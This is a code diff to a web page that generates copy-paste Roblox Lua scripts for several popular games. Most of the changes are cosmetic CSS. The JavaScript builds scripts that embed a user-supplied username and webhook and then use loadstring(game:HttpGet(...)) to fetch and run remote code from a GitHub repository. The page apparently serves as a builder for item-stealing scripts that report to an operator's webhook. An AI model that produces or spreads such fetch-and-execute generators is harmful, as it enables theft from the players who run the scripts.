@@ -8,7 +8,7 @@
         body {
             background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
             color: white;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             text-align: center;
             margin: 0;
             padding: 0;
@@ -21,28 +21,30 @@
         h1 {
             font-size: 3rem;
             animation: fadeIn 1.5s ease-in-out;
+            margin-bottom: 30px;
         }
         .container {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
+            gap: 20px;
         }
         .game-button {
-            background: #ff0080;
+            background: linear-gradient(45deg, #ff0080, #ff5c8d);
             color: white;
             border: none;
-            padding: 10px 20px;
-            font-size: 1rem;
-            border-radius: 10px;
+            padding: 12px 24px;
+            font-size: 1.2rem;
+            border-radius: 15px;
             cursor: pointer;
             transition: transform 0.3s, background 0.3s;
-            width: 200px;
+            width: 220px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
         }
         .game-button:hover {
-            background: #ff0055;
+            background: linear-gradient(45deg, #ff0055, #ff4d72);
             transform: scale(1.1);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.6);
         }
         .popup {
             display: none;
@@ -51,34 +53,36 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: #1e1e2e;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
             text-align: center;
-            max-width: 400px;
+            max-width: 500px;
             width: 90%;
         }
         .popup input {
             display: block;
             margin: 10px auto;
-            padding: 8px;
+            padding: 12px;
             width: 80%;
-            border-radius: 5px;
+            border-radius: 8px;
             border: 1px solid #ddd;
             background: #2c2c2c;
             color: white;
+            font-size: 1rem;
         }
         .popup button {
-            background: #ff0080;
+            background: linear-gradient(45deg, #ff0080, #ff5c8d);
             color: white;
             border: none;
-            padding: 10px;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 8px;
             cursor: pointer;
+            font-size: 1.2rem;
             margin-top: 10px;
         }
         .popup button:hover {
-            background: #ff0055;
+            background: linear-gradient(45deg, #ff0055, #ff4d72);
         }
         .script-output {
             background: #222;
@@ -86,21 +90,32 @@
             border-radius: 10px;
             color: #00ff00;
             font-family: monospace;
-            margin-top: 15px;
-            white-space: pre-wrap;
+            margin-top: 20px;
+            max-width: 90%;
+            margin: 0 auto;
+            display: none;
             word-wrap: break-word;
+            white-space: pre-wrap;
         }
         .copy-button {
             background: #00ff00;
             color: black;
             border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 8px;
             cursor: pointer;
             margin-top: 10px;
         }
         .copy-button:hover {
             background: #00cc00;
+        }
+        .updating {
+            background: #f0ad4e;
+            color: black;
+            padding: 8px 16px;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 15px;
         }
     </style>
 </head>
@@ -122,15 +137,20 @@
         <button onclick="closePopup()">Close</button>
     </div>
 
-    <div id="scriptOutput" class="script-output" style="display:none;"></div>
+    <div id="scriptOutput" class="script-output"></div>
 
     <script>
         let currentGame = '';
+        let lastGithubURL = '';
 
         function openPopup(game) {
             currentGame = game;
             document.getElementById('game-title').innerText = `Enter Details for ${game}`;
             document.getElementById('popup').style.display = 'block';
+            document.getElementById('scriptOutput').style.display = 'none';
+            document.getElementById('username').value = '';
+            document.getElementById('webhook').value = '';
+            lastGithubURL = '';
         }
 
         function closePopup() {
@@ -142,22 +162,33 @@
             let webhook = document.getElementById('webhook').value;
             if (username && webhook) {
                 let script;
+                let githubURL = '';
+                
                 if (currentGame === 'Blox Fruits') {
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`;
+                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits';
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
                 } else if (currentGame === 'Murder Mystery 2') {
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void'))()`;
+                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void';
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
                 } else if (currentGame === 'Adopt Me') {
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Adopt%20me'))()`;
+                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Adopt%20me';
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
                 } else if (currentGame === 'Pet Simulator 99') {
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Ps99'))()`;
+                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Ps99';
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
                 } else if (currentGame === 'Pls Donate') {
-                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Pls%20Donate'))()`;
+                    githubURL = 'https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Pls%20Donate';
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('${githubURL}'))()`;
+                }
+
+                if (githubURL !== lastGithubURL) {
+                    lastGithubURL = githubURL;
+                    showUpdatingNotification();
                 }
 
                 document.getElementById('scriptOutput').style.display = 'block';
                 document.getElementById('scriptOutput').textContent = script;
 
-                // Display a "Copy" button
                 let copyButton = document.createElement('button');
                 copyButton.textContent = 'Copy Script';
                 copyButton.classList.add('copy-button');
@@ -167,10 +198,20 @@
                     });
                 };
                 document.getElementById('scriptOutput').appendChild(copyButton);
-
             } else {
                 alert("Please enter both a username and webhook.");
             }
+        }
+
+        function showUpdatingNotification() {
+            const notification = document.createElement('div');
+            notification.classList.add('updating');
+            notification.textContent = 'Updating script...';
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.remove();
+            }, 2000);
         }
     </script>
 </body>
